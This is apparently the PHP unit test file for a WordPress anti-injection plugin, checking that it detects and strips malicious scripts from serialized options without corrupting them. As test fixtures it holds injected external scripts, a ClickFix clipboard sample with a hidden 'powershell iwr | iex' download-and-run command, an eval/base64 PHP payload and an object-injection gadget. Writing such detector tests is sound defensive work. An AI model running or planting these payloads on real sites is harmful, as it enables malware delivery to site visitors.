<?php
/**
 * Testes unitários sem WordPress e sem PHPUnit.
 *
 * Uso: php tests/run.php   (código de saída 1 se algum teste falhar)
 *
 * @package WP_Anti_Injection
 */

require __DIR__ . '/bootstrap.php';

$GLOBALS['wpai_pass'] = 0;
$GLOBALS['wpai_fail'] = 0;

/**
 * @param bool   $cond Condição.
 * @param string $msg  Descrição.
 */
function check( $cond, $msg ) {
	if ( $cond ) {
		$GLOBALS['wpai_pass']++;
		echo "  ok   - {$msg}\n";
	} else {
		$GLOBALS['wpai_fail']++;
		echo "  FAIL - {$msg}\n";
	}
}

/**
 * @param string   $name Nome.
 * @param callable $fn   Corpo.
 */
function test( $name, callable $fn ) {
	echo "\n# {$name}\n";
	try {
		$fn();
	} catch ( Throwable $e ) {
		check( false, 'exceção: ' . get_class( $e ) . ': ' . $e->getMessage() );
	}
}

/**
 * @param array $opts Opções.
 * @return WPAI_Cleaner
 */
function cleaner( array $opts = array() ) {
	return new WPAI_Cleaner(
		WPAI_Signatures::all(),
		$opts + array(
			'threshold' => 'high',
			'site_host' => 'site.exemplo.test',
		)
	);
}

/**
 * @param array $res Resultado de analyze().
 * @return string[]
 */
function sigs_of( array $res ) {
	return array_column( $res['findings'], 'signature' );
}

/**
 * @param array $res Resultado de analyze().
 * @return string[]
 */
function actions_of( array $res ) {
	return array_values( array_unique( array_column( $res['findings'], 'action' ) ) );
}

/** Classe "gadget" para provar que objetos não são instanciados. */
class WPAI_Test_Gadget {
	public $text;
	public function __construct( $t ) {
		$this->text = $t;
	}
	public function __wakeup() {
		$GLOBALS['wpai_wakeup_called'] = true;
	}
}

/* ---------------------------------------------------------------------- */

test(
	'assinaturas embutidas são todas válidas e compilam',
	function () {
		$v = WPAI_Signatures::validate( WPAI_Signatures::defaults() );
		check( count( $v['valid'] ) === count( WPAI_Signatures::defaults() ), 'todas válidas' );
		check( array() === $v['errors'], 'sem erros: ' . implode( '; ', $v['errors'] ) );
	}
);

test(
	'validação rejeita regex inválida, severidade e escopo desconhecidos',
	function () {
		$v = WPAI_Signatures::validate(
			array(
				'ruim_regex' => array( 'label' => 'x', 'scope' => 'any', 'severity' => 'high', 'pattern' => '/(/' ),
				'ruim_sev'   => array( 'label' => 'x', 'scope' => 'any', 'severity' => 'urgente', 'pattern' => '/a/' ),
				'ruim_scope' => array( 'label' => 'x', 'scope' => 'head', 'severity' => 'low', 'pattern' => '/a/' ),
				'Ruim-ID'    => array( 'label' => 'x', 'scope' => 'any', 'severity' => 'low', 'pattern' => '/a/' ),
				'boa'        => array( 'label' => 'x', 'scope' => 'any', 'severity' => 'low', 'pattern' => '/a/' ),
			)
		);
		check( array( 'boa' ) === array_keys( $v['valid'] ), 'só a válida passa' );
		check( 4 === count( $v['errors'] ), '4 erros' );
	}
);

test(
	'widget serializado: remove <script> externo e mantém a serialização íntegra',
	function () {
		$widget = array(
			2              => array(
				'title' => 'Avisos',
				'text'  => '<p>Olá</p><script src="//cdn.malicioso.invalid/x.js"></script>',
			),
			'_multiwidget' => 1,
		);
		$raw    = serialize( $widget );
		$res    = cleaner()->analyze( $raw );

		check( $res['serialized'], 'detectado como serializado' );
		check( in_array( 'script_external_src', sigs_of( $res ), true ), 'assinatura script_external_src' );
		check( array( 'remove' ) === actions_of( $res ), 'ação remove' );
		check( '[2][text]' === $res['findings'][0]['path'], 'caminho [2][text]' );
		check( is_string( $res['cleaned'] ), 'há valor limpo' );

		$u = unserialize( $res['cleaned'] );
		check( is_array( $u ), 'valor limpo continua desserializável' );
		check( '<p>Olá</p>' === $u[2]['text'], 'texto sem o script (multibyte preservado)' );
		check( 'Avisos' === $u[2]['title'] && 1 === $u['_multiwidget'], 'demais chaves intactas' );
	}
);

test(
	'regressão v1.0/v1.1: substituir direto no blob quebra o unserialize',
	function () {
		$raw = serialize( array( 'text' => '<p>a</p><script src="//cdn.malicioso.invalid/x.js"></script>' ) );

		$v10 = str_ireplace( '<script', '[REMOVED]', $raw );
		check( false === @unserialize( $v10 ), 'str_ireplace (v1.0) corrompe o serializado' );

		$v11 = preg_replace( '#<script\b[^>]*>.*?</script>#is', '', $raw );
		check( false === @unserialize( $v11 ), 'preg_replace (v1.1) corrompe o serializado' );

		$v2 = cleaner()->analyze( $raw );
		check( is_array( @unserialize( $v2['cleaned'] ) ), 'v2 mantém íntegro' );
	}
);

test(
	'<script> legítimo sem assinatura é preservado (texto e serializado)',
	function () {
		$html = '<p>x</p><script>window.dataLayer = window.dataLayer || [];</script>';
		$res  = cleaner()->analyze( $html );
		check( array() === $res['findings'], 'sem achados' );
		check( null === $res['cleaned'], 'nada a alterar' );

		$res2 = cleaner()->analyze( serialize( array( 'footer' => $html ) ) );
		check( null === $res2['cleaned'], 'serializado sem achados não é re-serializado' );
	}
);

test(
	'hosts confiáveis, mesmo host e caminho relativo não são marcados',
	function () {
		$html = '<script src="//static.cdn.confiavel.test/a.js"></script>'
			. '<script src="/wp-content/themes/tema/app.js"></script>'
			. '<script src="//site.exemplo.test/b.js"></script>';
		$res  = cleaner( array( 'trusted_hosts' => array( 'cdn.confiavel.test' ) ) )->analyze( $html );
		check( array() === $res['findings'], 'sem achados' );

		$res2 = cleaner()->analyze( '<script src="//static.cdn.confiavel.test/a.js"></script>' );
		check( array( 'script_external_src' ) === sigs_of( $res2 ), 'sem allowlist o mesmo host é marcado' );
	}
);

test(
	'src data: é tratado como não confiável',
	function () {
		$res = cleaner()->analyze( '<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>fim' );
		check( in_array( 'script_external_src', sigs_of( $res ), true ), 'marcado' );
		check( 'fim' === $res['cleaned'], 'removido' );
	}
);

test(
	'ClickFix: clipboard.writeText + powershell é crítico e removido; texto do falso captcha é reportado',
	function () {
		$html = '<div>Verificação de captcha: pressione Win + R e depois Ctrl + V</div>'
			. '<script>function f(){navigator.clipboard.writeText("powershell -w hidden -c iwr x | iex")}</script>';
		$res  = cleaner()->analyze( $html );
		$by   = array_column( $res['findings'], null, 'signature' );

		check( isset( $by['script_clickfix'] ) && 'critical' === $by['script_clickfix']['severity'], 'script_clickfix crítico' );
		check( isset( $by['script_clickfix'] ) && 'remove' === $by['script_clickfix']['action'], 'script removido' );
		check( isset( $by['fake_captcha_text'] ) && 'report' === $by['fake_captcha_text']['action'], 'texto do falso captcha só reportado' );
		check( '<div>Verificação de captcha: pressione Win + R e depois Ctrl + V</div>' === $res['cleaned'], 'resultado sem o script' );
	}
);

test(
	'limiar: severidade média só é removida com threshold=medium',
	function () {
		$html = '<script>var s=String.fromCharCode(104,105);</script>';

		$high = cleaner()->analyze( $html );
		check( array( 'script_fromcharcode' ) === sigs_of( $high ), 'detectado' );
		check( array( 'report' ) === actions_of( $high ), 'threshold=high: só reporta' );
		check( null === $high['cleaned'], 'threshold=high: nada alterado' );

		$med = cleaner( array( 'threshold' => 'medium' ) )->analyze( $html );
		check( '' === $med['cleaned'], 'threshold=medium: removido' );
	}
);

test(
	'iframe oculto removido, iframe visível mantido',
	function () {
		$visible = '<iframe src="//video.exemplo.test/embed/1" width="560" height="315"></iframe>';
		$html    = '<iframe src="//x.invalid/p" width="0" height="0" style="display:none"></iframe>' . $visible;
		$res     = cleaner()->analyze( $html );
		check( array( 'iframe_hidden' ) === sigs_of( $res ), 'um achado iframe_hidden' );
		check( $visible === $res['cleaned'], 'só o visível sobra' );
	}
);

test(
	'redirecionamento por document.location dentro de valor duplamente serializado',
	function () {
		$inner = serialize( array( 'html' => '<script>document.location="//x.invalid"</script>ok' ) );
		$raw   = serialize( $inner );
		$res   = cleaner()->analyze( $raw );
		check( in_array( 'script_location_redirect', sigs_of( $res ), true ), 'detectado' );
		$u = @unserialize( (string) $res['cleaned'] );
		$u = is_string( $u ) ? @unserialize( $u ) : false;
		check( is_array( $u ) && 'ok' === $u['html'], 'limpo nas duas camadas' );
	}
);

test(
	'stdClass é percorrido e re-serializado',
	function () {
		$o       = new stdClass();
		$o->html = '<script src="//evil.invalid/a.js"></script>Texto';
		$o->n    = 7;
		$res     = cleaner()->analyze( serialize( array( 'obj' => $o ) ) );
		$u       = unserialize( (string) $res['cleaned'], array( 'allowed_classes' => array( 'stdClass' ) ) );
		check( is_array( $u ) && 'Texto' === $u['obj']->html, 'propriedade limpa' );
		check( is_array( $u ) && 7 === $u['obj']->n, 'outras propriedades intactas' );
	}
);

test(
	'objeto de classe arbitrária: não instancia, não limpa, só reporta',
	function () {
		$GLOBALS['wpai_wakeup_called'] = false;
		$raw = serialize( array( 'x' => new WPAI_Test_Gadget( '<script>eval(atob("x"))</script>' ) ) );
		$res = cleaner()->analyze( $raw );
		check( false === $GLOBALS['wpai_wakeup_called'], '__wakeup NÃO executado (sem injeção de objeto)' );
		check( null !== $res['blocked'], 'bloqueado: ' . (string) $res['blocked'] );
		check( null === $res['cleaned'], 'nada alterado' );
		check( in_array( 'script_eval', sigs_of( $res ), true ), 'achado reportado mesmo assim' );
		check( array( 'report' ) === actions_of( $res ), 'todas as ações viram report' );
	}
);

test(
	'serializado corrompido: não limpa, só reporta',
	function () {
		$res = cleaner()->analyze( 'a:1:{s:4:"text";s:999:"<script>eval(1)</script>";}' );
		check( null === $res['cleaned'], 'nada alterado' );
		check( false !== strpos( (string) $res['blocked'], 'corrompido' ), 'motivo: corrompido' );
		check( in_array( 'script_eval', sigs_of( $res ), true ), 'achado reportado' );
	}
);

test(
	'referências serializadas (R:) bloqueiam a limpeza',
	function () {
		$a      = array( 'x' => '<script>eval(1)</script>' );
		$a['y'] = &$a['x'];
		$res    = cleaner()->analyze( serialize( $a ) );
		check( null === $res['cleaned'], 'nada alterado' );
		check( false !== strpos( (string) $res['blocked'], 'referências' ), 'motivo: referências' );
	}
);

test(
	'JSON (ex.: construtor de página): detecta, mas não altera',
	function () {
		$res = cleaner()->analyze( '{"html":"<script>eval(1)<\/script>"}' );
		check( in_array( 'script_eval', sigs_of( $res ), true ), 'detectado com </script> escapado' );
		check( null === $res['cleaned'], 'nada alterado' );
		check( false !== strpos( (string) $res['blocked'], 'JSON' ), 'motivo: JSON' );
	}
);

test(
	'payload PHP em texto é reportado, nunca "recortado"',
	function () {
		$res = cleaner()->analyze( 'texto <?php eval(base64_decode("aGVsbG8=")); ?>' );
		$s   = sigs_of( $res );
		check( in_array( 'php_eval_payload', $s, true ) && in_array( 'php_base64_decode', $s, true ), 'duas assinaturas' );
		check( null === $res['cleaned'], 'nada alterado' );
	}
);

test(
	'valores triviais',
	function () {
		foreach ( array( 'b:0;', 'N;', '', 'texto comum', 'i:5;' ) as $v ) {
			$res = cleaner()->analyze( $v );
			check( array() === $res['findings'] && null === $res['cleaned'] && null === $res['blocked'], var_export( $v, true ) );
		}
		$res = cleaner()->analyze( null );
		check( array() === $res['findings'], 'null' );
	}
);

test(
	'trecho do relatório não carrega caracteres de controle (ANSI)',
	function () {
		$res = cleaner()->analyze( "<script>\x1b[31m;eval(1)</script>" );
		check( ! empty( $res['findings'] ), 'há achado' );
		check( false === strpos( $res['findings'][0]['excerpt'], "\x1b" ), 'sem ESC no trecho' );
	}
);

test(
	'allowlist e hosts (WPAI_Settings)',
	function () {
		check( WPAI_Settings::name_matches( 'widget_text', array( 'widget_*' ) ), 'curinga casa' );
		check( ! WPAI_Settings::name_matches( 'widget_text', array( 'widget' ) ), 'sem curinga é exato' );
		check( ! WPAI_Settings::name_matches( 'axb', array( 'a.b' ) ), 'ponto é literal' );
		check( 'cdn.exemplo.test' === WPAI_Settings::normalize_host( 'HTTPS://CDN.Exemplo.test/x.js?y' ), 'normaliza URL' );
		check( 'cdn.exemplo.test' === WPAI_Settings::normalize_host( 'cdn.exemplo.test:8443' ), 'remove porta' );
		check( '' === WPAI_Settings::normalize_host( '<b>' ), 'rejeita lixo' );
		check( WPAI_Settings::host_trusted( 'a.b.exemplo.test', array( 'exemplo.test' ) ), 'subdomínio confiável' );
		check( ! WPAI_Settings::host_trusted( 'malexemplo.test', array( 'exemplo.test' ) ), 'sufixo sem ponto não conta' );

		$s = WPAI_Settings::sanitize(
			array(
				'threshold'      => 'urgente',
				'allow_post_ids' => "12, 0, -3, abc\n12",
				'batch_size'     => 999999,
			)
		);
		check( 'high' === $s['threshold'], 'threshold inválido volta ao padrão' );
		check( array( 12 ) === $s['allow_post_ids'], 'IDs saneados' );
		check( 2000 === $s['batch_size'], 'lote limitado' );
	}
);

/* ---------------------------------------------------------------------- */

printf( "\n%d passaram, %d falharam\n", $GLOBALS['wpai_pass'], $GLOBALS['wpai_fail'] );
exit( $GLOBALS['wpai_fail'] > 0 ? 1 : 0 );
